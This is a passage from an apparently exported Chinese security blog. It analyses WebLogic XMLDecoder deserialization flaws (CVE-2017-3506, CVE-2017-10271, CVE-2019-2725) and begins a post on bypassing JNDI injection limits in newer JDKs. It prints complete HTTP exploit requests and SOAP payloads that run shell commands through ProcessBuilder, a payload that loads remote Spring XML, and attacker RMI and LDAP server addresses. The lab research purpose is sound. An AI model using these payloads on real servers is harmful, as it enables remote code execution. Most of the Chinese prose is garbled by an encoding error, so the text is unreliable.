&#123;"/bin/bash", "-c", "open -a Calculator"&#125;;new ProcessBuilder(cmdList).start(); ÂÖ≥‰∫éXMLDecoderËß£ÊûêÊµÅÁ®ãÂèØ‰ª•ÁúãËøôÁØáÊñáÁ´†ÔºöXMLDecoderËß£ÊûêÊµÅÁ®ãÂàÜÊûê ÁéØÂ¢ÉÊê≠Âª∫vulhubÁéØÂ¢ÉÔºöhttps://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271 ËøôÈáåÈúÄË¶ÅËøúÁ®ãË∞ÉËØïÔºå‰øÆÊîπÈÖçÁΩÆÔºödocker-compose.yml1234567version: '2'services: weblogic: image: vulhub/weblogic ports: - "7001:7001" - "8453:8453" ÊâßË°ådocker-compose up -dÔºåÊãâËµ∑ÂÆπÂô®ÂêéÔºåËøõÂÖ•ÂÆπÂô®Ôºå‰øÆÊîπÈÖçÁΩÆÔºö/root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.shÔºåÊ∑ªÂä†debugÈÖçÁΩÆÔºö12debugFlag=&quot;true&quot;export debugFlag ÈáçÂêØÂÆπÂô®ÔºåÂÜçËøõÂÖ•ÂÆπÂô®Êü•ÁúãÁ´ØÂè£Ôºö Êã∑Ë¥ùÊ∫êÁ†ÅÔºö12docker cp 0e1ef58d4a70:/root/Oracle/Middleware/wlserver_10.3 ./docker cp 0e1ef58d4a70:/root/Oracle/Middleware/modules ./ ÊäòËÖæÂ•Ω‰πãÂêéÔºå‰∏ãÂ•ΩÊñ≠ÁÇπÔºåÊµèËßàÂô®Ëß¶ÂèëËØ∑Ê±ÇÔºåÁªìÊûúÂ∑®ÊÖ¢ÔºåÂä†ËΩΩ‰∫ÜÂæà‰πÖ„ÄÇ Á¥¢ÊÄßÂú®Êú¨Âú∞Ë£Ö‰∏Ä‰∏™ÔºåÂÆòÁΩë‰∏ãËΩΩÂÆâË£ÖÁöÑjarÂåÖÔºå‰ΩøÁî®Ëøô‰∏™ÂëΩ‰ª§ÂÆâË£Öjava -Dspace.detection=false -jar wls1036_generic.jar(‰∏çÂä†-Dspace.detection=falseÂèÇÊï∞‰ºöÁàÜÁ©∫Èó¥‰∏çË∂≥) ÂÆâË£ÖËøáÁ®ãÊïôÁ®ãÔºöhttps://blog.csdn.net/weixin_40102675/article/details/88180647 Ë£ÖÂ•ΩÂêéÂêØÂä®weblogic12cd ~/Oracle/Middleware/user_projects/domains/base_domain/bin./startWeblogic.sh Âéªhttps://127.0.0.1:7001/consoleÔºåËæìÂÖ•ÂØÜÁ†Åweblogic weblogic@123 ÂÖ∂‰ªñdebugÈÖçÁΩÆÂíå‰∏äËø∞‰∏ÄÊ†∑„ÄÇ ÊºèÊ¥ûÂ§çÁé∞EXP:123456789101112131415161718192021222324252627282930313233POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 127.0.0.1:7001Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.95 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: PHPSESSID=mgr2tl959j6r7qbi9dadh0tsv5Connection: closeContent-Type: text/xmlContent-Length: 599&lt;soapenv:Envelope xmlns:soapenv=&quot;https://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;https://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;open -a Calculator&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; ÊºèÊ¥ûÂàÜÊûê‰ªépocÁöÑË∑ØÁî±Êù•ÁúãÔºåwls-wsatËøô‰∏™Êé•Âè£Âá∫‰∫ÜÈóÆÈ¢òÔºåÊâæÂà∞ËØ•warÂåÖÁöÑweb.xmlÈÖçÁΩÆÔºåÂÆö‰ΩçÂà∞ÂÖ∂ÂØπÂ∫îÁöÑServletÔºöweblogic.wsee.wstx.wsat.v10.endpoint.CoordinatorPortTypePortImpl Ëøô‰∏™Âç≥‰∏∫ÊºèÊ¥û‰ΩúÁî®ÁöÑÊé•Âè£ÔºåÂÖà‰ªéexpÁöÑÂìçÂ∫îÂåÖËøîÂõûÁöÑË∞ÉÁî®Ê†àÊù•Ë∑ü‰∏Ä‰∏ãprocessRequestÔºö weblogic.wsee.jaxws.workcontext.WorkContextServerTube#processRequestvar1Âç≥Êàë‰ª¨‰º†ÂÖ•ÁöÑXMLÔºåvar3‰∏∫soapÊ†áÁ≠æËß£ÊûêÁªìÊûúÔºåË∑üËøõweblogic.wsee.jaxws.workcontext.WorkContextTube#readHeaderOldvar4‰∏∫pocÂÖ≥ÈîÆÈÉ®ÂàÜÔºåË∑üËøõreceiveÂáΩÊï∞Ôºå/weblogic/wsee/jaxws/workcontext/WorkContextServerTube.class#receive ‰∏ÄÁõ¥ÂæÄ‰∏ãË∑üÔºö-&gt; /weblogic/workarea/WorkContextLocalMap.class#receiveRequest-&gt; /weblogic/workarea/spi/WorkContextEntryImpl.class#readEntry-&gt; /weblogic/wsee/workarea/WorkContextXmlInputAdapter.class#readUTFË∞ÉÁî®‰∫ÜxmlDecoderÁöÑreadObjectÂáΩÊï∞ËøõË°åÂèçÂ∫èÂàóÂåñÊìç‰ΩúÔºåÊúÄÁªàÈÄ†ÊàêÂëΩ‰ª§ÊâßË°å„ÄÇ Ë∞ÉÁî®Ê†àÔºö Ë°•‰∏ÅweblogicË°•‰∏ÅÂè™Áªô‰ªòË¥πÁî®Êà∑ÂèëÔºåÊàë‰πüÂ∞±Âè™ËÉΩÂ∫∑Â∫∑Âà´‰∫∫ÊñáÁ´†ÈáåÁöÑË°•‰∏ÅÊù•ÂàÜÊûê‰∫Ü„ÄÇ ËøôÈáåË°•‰∏ÅÂú®WorkContextXmlInputAdapter‰∏≠Ê∑ªÂä†‰∫ÜvalidateÈ™åËØÅÔºåÈôêÂà∂‰∫ÜObjectÊ†áÁ≠æÔºå‰ªéËÄåÈôêÂà∂ÈÄöËøáXMLÊù•ÊûÑÈÄ†Á±ª„ÄÇ12345678910111213141516171819private void validate(InputStream is) &#123; WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try &#123; SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() &#123; public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123; if(qName.equalsIgnoreCase("object")) &#123; throw new IllegalStateException("Invalid context type: object"); &#125; &#125; &#125;); &#125; catch (ParserConfigurationException var5) &#123; throw new IllegalStateException("Parser Exception", var5); &#125; catch (SAXException var6) &#123; throw new IllegalStateException("Parser Exception", var6); &#125; catch (IOException var7) &#123; throw new IllegalStateException("Parser Exception", var7); &#125; &#125; Ëøô‰∏™ÁâàÊú¨ÂØπÂ∫îÁöÑpoc:1234567891011121314151617181920212223&lt;soapenv:Envelope xmlns:soapenv="https://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work="https://bea.com/2004/06/soap/workarea/"&gt; &lt;java&gt; &lt;object class="java.lang.ProcessBuilder"&gt; &lt;array class="java.lang.String" length="3"&gt; &lt;void index="0"&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index="1"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index="2"&gt; &lt;string&gt;open -a Calculator&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method="start"/&gt; &lt;/object&gt;&lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; ‰πüÊ≠£ÊòØÂõ†‰∏∫ËøôÊ†∑ÁöÑÈªëÂêçÂçïÈôêÂà∂ÔºåÊâÄ‰ª•ÂæàÂø´Â∞±Âá∫‰∫ÜCVE-2017-10271„ÄÇ CVE-2017-10271Ëøô‰∏™ÁâàÊú¨ÂØπÂ∫îÁöÑpocÔºåÂç≥Âíå‰∏äËæπÁöÑÂå∫Âà´Âç≥Â∞Üobject‰øÆÊîπÊàêvoidÔºåÂ∞±ËΩªÊùæÁªïËøá‰∫ÜË°•‰∏ÅÔºö1234567891011121314151617181920212223&lt;soapenv:Envelope xmlns:soapenv="https://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work="https://bea.com/2004/06/soap/workarea/"&gt; &lt;java&gt; &lt;void class="java.lang.ProcessBuilder"&gt; &lt;array class="java.lang.String" length="3"&gt; &lt;void index="0"&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index="1"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index="2"&gt; &lt;string&gt;open -a Calculator&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method="start"/&gt; &lt;/void&gt;&lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; ÁÆÄÂçïÁúã‰∫Ü‰∏Ä‰∫õXMLDecoderËß£ÊûêÊµÅÁ®ãÂàÜÊûêÊñáÁ´†‰∏≠ÁöÑÂàÜÊûêÔºåVoidElementHandlerÁ±ªÁªßÊâøÁöÑObjectElementsHandlerÁ±ªÔºåÂè™ÊîπÂÜô‰∫ÜisArgumentÂáΩÊï∞ÔºåËÄåÂú®Êï¥‰∏™Ëß¶ÂèëËøáÁ®ã‰∏≠Âπ∂Êó†ÂΩ±ÂìçÔºåÊâÄ‰ª•Ê≠§Â§Ñ‰ΩøÁî®voidÊ†áÁ≠æ‰∏éobjectÊ†áÁ≠æÊ≤°ÊúâÂå∫Âà´„ÄÇ ËÄåË°•‰∏ÅÁöÑÂΩ¢Âºè‰æùÁÑ∂ÊòØÈªëÂêçÂçïÈôêÂà∂Ê†áÁ≠æÁöÑÂΩ¢ÂºèÔºö1234567891011121314151617181920212223242526private void validate(InputStream is) &#123; WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try &#123; SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() &#123; private int overallarraylength = 0; public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123; if(qName.equalsIgnoreCase("object")) &#123; throw new IllegalStateException("Invalid element qName:object"); &#125; else if(qName.equalsIgnoreCase("new")) &#123; throw new IllegalStateException("Invalid element qName:new"); &#125; else if(qName.equalsIgnoreCase("method")) &#123; throw new IllegalStateException("Invalid element qName:method"); &#125; else &#123; if(qName.equalsIgnoreCase("void")) &#123; for(int attClass = 0; attClass &lt; attributes.getLength(); ++attClass) &#123; if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) &#123; throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass)); &#125; &#125; &#125; if(qName.equalsIgnoreCase("array")) &#123; String var9 = attributes.getValue("class"); if(var9 != null &amp;&amp; !var9.equalsIgnoreCase("byte")) &#123; throw new IllegalStateException("The value of class attribute is not valid for array element."); &#125; CVE-2019-2725Êó∂Èöî‰∏§Âπ¥Ôºö123456789101112131415161718192021222324252627282930POST /_async/AsyncResponseService HTTP/1.1Host: localhost:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: text/xmlContent-Length: 728Cookie: remember-me=MXPUSANQRVaBJYtUucUgmQ==Connection: closeUpgrade-Insecure-Requests: 1&lt;soapenv:Envelope xmlns:soapenv=&quot;https://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;https://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;https://www.bea.com/async/AsyncResponseService&quot;&gt; &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt; &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt; &lt;work:WorkContext xmlns:work=&quot;https://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java&gt; &lt;class&gt; &lt;string&gt;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&lt;/string&gt; &lt;void&gt; &lt;string&gt;https://xxxx&lt;/string&gt; &lt;/void&gt; &lt;/class&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body&gt; &lt;asy:onAsyncDelivery/&gt; &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt; ‰ΩøÁî®classÊ†áÁ≠æÊûÑÈÄ†Á±ªÔºå‰ΩÜÊòØÁî±‰∫éÈôêÂà∂‰∫ÜmethodÂáΩÊï∞ÔºåÊó†Ê≥ïËøõË°åÂáΩÊï∞Ë∞ÉÁî®ÔºåÂè™ËÉΩ‰ªéÊûÑÈÄ†ÊñπÊ≥ï‰∏ãÊâãÔºå‰∏îÂèÇÊï∞‰∏∫Âü∫Êú¨Á±ªÂûãÔºö ÊûÑÈÄ†ÂáΩÊï∞ÊúâÂÜôÊñá‰ª∂Êìç‰ΩúÔºåÊñá‰ª∂ÂêçÂíåÂÜÖÂÆπÂèØÊéßÔºåÂèØ‰ª•ËøõË°ågetshell„ÄÇ ÊûÑÈÄ†ÂáΩÊï∞ÊúâÂÖ∂‰ªñÁöÑÂèçÂ∫èÂàóÂåñÊìç‰ΩúÔºåÊàë‰ª¨ÂèØ‰ª•ËøõË°å‰∫åÊ¨°ÂèçÂ∫èÂàóÂåñÊìç‰Ωú„ÄÇ ÊûÑÈÄ†ÂáΩÊï∞Áõ¥Êé•ÊúâÊâßË°åÂëΩ‰ª§ÁöÑÊìç‰ΩúÔºåÊâßË°åÂëΩ‰ª§ÂèØÊéß„ÄÇ ÊúâÂÖ∂ÂÆÉÁöÑÂèØËÉΩÂØºËá¥rceÁöÑÊìç‰ΩúÔºåÊØîÂ¶ÇË°®ËææÂºèÊ≥®ÂÖ•‰πãÁ±ªÁöÑ„ÄÇ ÁΩë‰∏äÈÄöÁî®ÁöÑÊúâÔºö FileSystemXmlApplicationContext UnitOfWorkChangeSet ËøôÊ¨°ÁöÑ‰øÆÂ§çÊúÄÁªàÂ∞ÜclassÊ†áÁ≠æÁªôÁ¶ÅÁî®‰∫Ü„ÄÇ cve-2019-2729https://xz.aliyun.com/t/7116jdk1.7ÊØîjdk1.6Â§ö‰∫ÜÂá†‰∏™Ê†áÁ≠æpropertyÂíåfieldÊ†áÁ≠æ„ÄÇÈÄöËøáË∞ÉÁî®ÈùôÊÄÅÂ±ûÊÄßÁöÑget„ÄÅsetÊñπÊ≥ïÊù•Ëß¶Âèë„ÄÇ ÊúÄÂêéËÉΩÂäõÊúâÈôêÔºå‰ªéÊê≠Âª∫Âà∞Â§çÁé∞ÂàÜÊûêËä±‰∫Ü‰∏çÂ∞ëÊó∂Èó¥ÔºåÂú®ËøáÁ®ã‰∏≠‰πüÂ≠¶‰π†Êî∂Ëé∑‰∏çÂ∞ë„ÄÇÊúÄÂêéÊÑüË∞¢@hu3skyÂ∏àÂÇÖÁöÑÂ∏ÆÂä©Ôºå‰ª•Âèä‰∏ãÈù¢Ëøô‰∫õÂ∏àÂÇÖÁöÑÊñáÁ´†ÂàÜ‰∫´„ÄÇ ÂèÇËÄÉÊñáÁ´†Ôºö @whip1ash CVE-2017-3506 &amp; CVE-2017-10271 - ‰ªé0ÂºÄÂßãÂ≠¶‰π†JavaÂèçÂ∫èÂàóÂåñ (1) @gyyyy„ÄäÊµÖÊûêJavaÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñ„Äã WebLogic Âä®ÊÄÅË∞ÉËØïÁéØÂ¢ÉÊê≠Âª∫ XMLDecoderËß£ÊûêÊµÅÁ®ãÂàÜÊûê @kingkk Weblogic-XMLDecoderÂèçÂ∫èÂàóÂåñÂ≠¶‰π†]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>ÊºèÊ¥ûÂàÜÊûê</tag>
        <tag>weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JNDIÊ≥®ÂÖ•È´òÁâàÊú¨jdkÁªïËøáÂ≠¶‰π†]]></title>
    <url>%2F2020%2F02%2F04%2FJNDI%E6%B3%A8%E5%85%A5%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[Âú®‰πãÂâçÁöÑÂ§çÁé∞ÂàÜÊûêËøáÁ®ã‰∏≠Áî®Âà∞ÁöÑjdkÁâàÊú¨ÈÉΩÊòØËæÉ‰ΩéÁöÑÁâàÊú¨ÔºåËøôÁØáÊñáÁ´†‰∏ªË¶ÅÁ†îÁ©∂‰∏çÂêåjdkÁâàÊú¨ÂØπJNDIÊ≥®ÂÖ•‰∏çÂêåÂßøÂäøÁöÑÂΩ±ÂìçÔºå‰ª•ÂèäÁªïËøáÂßøÂäø„ÄÇÂÖ≥‰∫éJNDIÊ≥®ÂÖ•ÂíåRMIÁöÑÂü∫Á°ÄÁü•ËØÜÂèØ‰ª•ÂèÇËÄÉËøô‰∏§ÁØáÊñáÁ´†Â≠¶‰π†Ôºö curz0n: CVE-2019-14540ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÂàÜÊûê&amp;Â§çÁé∞ kingx: Ê∑±ÂÖ•ÁêÜËß£JNDIÊ≥®ÂÖ•‰∏éJavaÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂà©Áî® RMI Remote Object Payload (ÈôêÂà∂ËæÉÂ§öÔºå‰∏çÂ∏∏‰ΩøÁî®)RMI + JNDI Reference PayloadËøô‰∏™ÊñπÊ≥ïÂ∞±ÊòØÊàë‰ª¨Â∏∏Áî®ÁöÑÂä†ËΩΩËøúÁ®ãclassËøõË°åJNDIÊ≥®ÂÖ•ÁöÑÊìç‰ΩúÔºåÊîªÂáªËÄÖÈÄöËøáRMIÊúçÂä°ËøîÂõû‰∏Ä‰∏™JNDI Naming ReferenceÔºåÂèóÂÆ≥ËÄÖËß£Á†ÅReferenceÊó∂‰ºöÂéªÊàë‰ª¨ÊåáÂÆöÁöÑCodebaseËøúÁ®ãÂú∞ÂùÄÂä†ËΩΩFactoryÁ±ªÔºå‰ΩÜÊòØÂéüÁêÜ‰∏äÂπ∂Èùû‰ΩøÁî®RMI Class LoadingÊú∫Âà∂ÁöÑÔºåÂõ†Ê≠§‰∏çÂèó java.rmi.server.useCodebaseOnlyÁ≥ªÁªüÂ±ûÊÄßÁöÑÈôêÂà∂ÔºåÁõ∏ÂØπÊù•ËØ¥Êõ¥Âä†ÈÄöÁî®„ÄÇ ‰ΩÜÊòØÂú®JDK 6u132,JDK 7u122,JDK 8u113 ‰∏≠JavaÊèêÂçá‰∫ÜJNDI ÈôêÂà∂‰∫ÜNaming/DirectoryÊúçÂä°‰∏≠JNDI ReferenceËøúÁ®ãÂä†ËΩΩObject FactoryÁ±ªÁöÑÁâπÊÄß„ÄÇÁ≥ªÁªüÂ±ûÊÄßcom.sun.jndi.rmi.object.trustURLCodebase„ÄÅcom.sun.jndi.cosnaming.object.trustURLCodebase ÁöÑÈªòËÆ§ÂÄºÂèò‰∏∫falseÔºåÂç≥ÈªòËÆ§‰∏çÂÖÅËÆ∏‰ªéËøúÁ®ãÁöÑCodebaseÂä†ËΩΩReferenceÂ∑•ÂéÇÁ±ª„ÄÇÂ¶ÇÊûúÈúÄË¶ÅÂºÄÂêØRMI RegistryÊàñËÄÖCOS Naming Service ProviderÁöÑËøúÁ®ãÁ±ªÂä†ËΩΩÂäüËÉΩÔºåÈúÄË¶ÅÂ∞ÜÂâçÈù¢ËØ¥ÁöÑ‰∏§‰∏™Â±ûÊÄßÂÄºËÆæÁΩÆ‰∏∫true„ÄÇ Changelog: JDK 6u141 https://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141 JDK 7u131 https://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html JDK 8u121 https://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html Ê°à‰æãÂèÇËÄÉÁ¨îËÆ∞ÔºöÊ∑±ÂÖ•ÁêÜËß£RMI&amp;JRMP&amp;JNDI Ëß¶ÂèëËøáÁ®ãÂàÜÊûê‰ΩéÁâàÊú¨8u73ÊµãËØï‰∫ßÁîüJNDIÊ≥®ÂÖ•ÁöÑÂéüÂõ†ÊòØÂÆ¢Êà∑Á´ØlookupÊñπÊ≥ïÂèØÊéßÔºåÊàë‰ª¨ÂÖàÂú®Registry‰∏≠Ê≥®ÂÜåÊÅ∂ÊÑèÁöÑReferenceÂØπË±°ÔºåÂä†ËΩΩËøúÁ®ãÁ±ªÂØπË±°„ÄÇ Â∞ÜRegistryÁöÑurlÂú∞ÂùÄ‰º†ÂÖ•InitialContext.lookup(URL)ÊñπÊ≥ï‰∏≠ÔºåËøôÈáåÁî®‰ΩéÁâàÊú¨8u73‰∏ãÊñ≠ÁÇπË∞ÉËØï:/com/sun/jndi/toolkit/url/GenericURLContext.classËß£ÊûêURLÔºåÂ∞ÜExploitÁ±ª‰º†ÂÖ•ÔºålookupÊñπÊ≥ïË∞ÉÁî®decodeObjectÊñπÊ≥ïÔºö/com/sun/jndi/rmi/registry/RegistryContext.classÂèàËøõÂÖ•Âà∞NamingManager.getObjectInstanceÊñπÊ≥ïÔºöÂú®ËøõÂÖ•getObjectInstanceÊñπÊ≥ïÂêéÂèàÂú®319Ë°åË∞ÉÁî®getObjectFactoryFromReferenceÊñπÊ≥ïÔºåÂÖà‰ªéÊú¨Âú∞ÁöÑÁ±ªÂä†ËΩΩÂô®ÂéªclasspathÂä†ËΩΩÁõÆÊ†áÁ±ªÔºåÂ¶ÇÊûúÊ≤°ÊúâÔºåÂàôË∞ÉÁî®loadClass(factoryName, codebase)ÂéªËøúÁ®ãÂä†ËΩΩÊàë‰ª¨ÊûÑÈÄ†ÁöÑÁâπÂÆöÁ±ªÔºåÂπ∂Â∞ÜÂÖ∂ÂÆû‰æãÂåñÔºö Êï¥‰∏™Âà©Áî®ÊµÅÁ®ãÔºö ÁõÆÊ†á‰ª£Á†Å‰∏≠Ë∞ÉÁî®‰∫ÜInitialContext.lookup(URI)Ôºå‰∏îURI‰∏∫Áî®Êà∑ÂèØÊéßÔºõ ÊîªÂáªËÄÖÊéßÂà∂URIÂèÇÊï∞‰∏∫ÊÅ∂ÊÑèÁöÑRMIÊúçÂä°Âú∞ÂùÄÔºåÂ¶ÇÔºörmi://hacker_rmi_server/classnameÔºõ ÂáªËÄÖRMIÊúçÂä°Âô®ÂêëÁõÆÊ†áËøîÂõû‰∏Ä‰∏™ReferenceÂØπË±°ÔºåReferenceÂØπË±°‰∏≠ÊåáÂÆöÊüê‰∏™Á≤æÂøÉÊûÑÈÄ†ÁöÑFactoryÁ±ªÔºõ ÁõÆÊ†áÂú®ËøõË°ålookup()Êìç‰ΩúÊó∂Ôºå‰ºöÂä®ÊÄÅÂä†ËΩΩÂπ∂ÂÆû‰æãÂåñFactoryÁ±ªÔºåÊé•ÁùÄË∞ÉÁî®factory.getObjectInstance()Ëé∑ÂèñÂ§ñÈÉ®ËøúÁ®ãÂØπË±°ÂÆû‰æãÔºõ ÊîªÂáªËÄÖÂèØ‰ª•Âú®FactoryÁ±ªÊñá‰ª∂ÁöÑÊûÑÈÄ†ÊñπÊ≥ï„ÄÅÈùôÊÄÅ‰ª£Á†ÅÂùó„ÄÅgetObjectInstance()ÊñπÊ≥ïÁ≠âÂ§ÑÂÜôÂÖ•ÊÅ∂ÊÑè‰ª£Á†ÅÔºåËææÂà∞RCEÁöÑÊïàÊûúÔºõ È´òÁâàÊú¨8u201ÊµãËØïÂÜçÊù•ÁúãÁúãÈ´òÁâàÊú¨8u201ÔºåÂú®RegistryContext.class#decodeObjectÂáΩÊï∞‰∏≠ÔºåÂ¢ûÂä†‰∫ÜtrustURLCodebaseÁöÑÂà§Êñ≠Ôºå‰∏îÈªòËÆ§‰∏∫false„ÄÇ Â§ö‰∏™Âà§Êñ≠ÊòØÈÄªËæë‰∏éÁöÑÂÖ≥Á≥ªÔºåÊúâ‰∏Ä‰∏™‰∏çÊàêÁ´ãÂàôÂèØÈÄöËøáÔºåËøôÈáåÂèØ‰ª•Âà©Áî®var8.getFactoryClassLocation()‰∏∫nullËøõÂÖ•NamingManager.getObjectInstanceÂáΩÊï∞ÔºöÊé•ÁùÄËøõÂÖ•getObjectFactoryFromReferenceÂáΩÊï∞Ôºå‰ΩÜÊòØÂú®Âä†ËΩΩËøúÁ®ãÁ±ª‰πãÂâçÂèàËøõË°å‰∫Ü‰∏ÄÊ¨°nullÂà§Êñ≠ÔºåÂä†ËΩΩËøúÁ®ãÁ±ªÔºö ÊâÄ‰ª•ËøôÈáåÁöÑÂà©Áî®Êù°‰ª∂Â∞±ÂèòÊàê‰∫ÜÂè™ËÉΩÁî®helper.loadClass(factoryName)Âä†ËΩΩÁõÆÊ†áÊú∫Âô®‰∏≠classpath‰∏≠ÁöÑÁ±ª„ÄÇ‰ªé‰∏ãÂõæNamingManager.javaÁöÑ‰ª£Á†Å‰∏≠ÂèØ‰ª•Áü•ÈÅìÔºåËØ•Á±ªË¶ÅÂÆûÁé∞ javax.naming.spi.ObjectFactoryÊé•Âè£Ôºå‰∏îÂ≠òÂú®getObjectInstanceÊñπÊ≥ïÔºö ÊÄªÁªì‰∏Ä‰∏ãÈ´òÁâàÊú¨Âà©Áî®Êù°‰ª∂Âç≥Ôºö Âà©Áî®ÁõÆÊ†áÊú∫Âô®classpathÁ±ª ÂÆûÁé∞‰∫Üjavax.naming.spi.ObjectFactoryÊé•Âè£ Â≠òÂú®getObjectInstanceÊñπÊ≥ï Âú®‰∏ãÊñá‰∏≠‰ºö‰ªãÁªçËØ¶ÁªÜÊ°à‰æãÂà©Áî®ÁªÜËäÇ„ÄÇ LDAP + JNDI Reference PayloadÈô§‰∫ÜRMIÊúçÂä°‰πãÂ§ñÔºåJNDIËøòÂèØ‰ª•ÂØπÊé•LDAPÊúçÂä°ÔºåLDAP‰πüËÉΩËøîÂõûJNDI ReferenceÂØπË±°ÔºåÂà©Áî®ËøáÁ®ã‰∏é‰∏äÈù¢RMI ReferenceÂü∫Êú¨‰∏ÄËá¥ÔºåÂè™ÊòØlookup()‰∏≠ÁöÑURL‰∏∫‰∏Ä‰∏™LDAPÂú∞ÂùÄÔºöldap://xxx/xxxÔºåÁî±ÊîªÂáªËÄÖÊéßÂà∂ÁöÑLDAPÊúçÂä°Á´ØËøîÂõû‰∏Ä‰∏™ÊÅ∂ÊÑèÁöÑJNDI ReferenceÂØπË±°„ÄÇÂπ∂‰∏îLDAPÊúçÂä°ÁöÑReferenceËøúÁ®ãÂä†ËΩΩFactoryÁ±ª‰∏çÂèó‰∏ä‰∏ÄÁÇπ‰∏≠ com.sun.jndi.rmi.object.trustURLCodebase„ÄÅcom.sun.jndi.cosnaming.object.trustURLCodebaseÁ≠âÂ±ûÊÄßÁöÑÈôêÂà∂ÔºåÊâÄ‰ª•ÈÄÇÁî®ËåÉÂõ¥Êõ¥Âπø„ÄÇ‰∏çËøáÂú®2018Âπ¥10ÊúàÔºåJavaÊúÄÁªà‰πü‰øÆÂ§ç‰∫ÜËøô‰∏™Âà©Áî®ÁÇπÔºåÂØπLDAP ReferenceËøúÁ®ãÂ∑•ÂéÇÁ±ªÁöÑÂä†ËΩΩÂ¢ûÂä†‰∫ÜÈôêÂà∂ÔºåÂú®Oracle JDK 11.0.1„ÄÅ8u191„ÄÅ7u201„ÄÅ6u211‰πãÂêé com.sun.jndi.ldap.object.trustURLCodebase Â±ûÊÄßÁöÑÈªòËÆ§ÂÄºË¢´Ë∞ÉÊï¥‰∏∫falseÔºåËøòÂØπÂ∫îÁöÑÂàÜÈÖç‰∫Ü‰∏Ä‰∏™ÊºèÊ¥ûÁºñÂè∑CVE-2018-3149„ÄÇ Ê°à‰æãÂèÇËÄÉÁ¨îËÆ∞ÔºöÊ∑±ÂÖ•ÁêÜËß£RMI&amp;JRMP&amp;JNDI 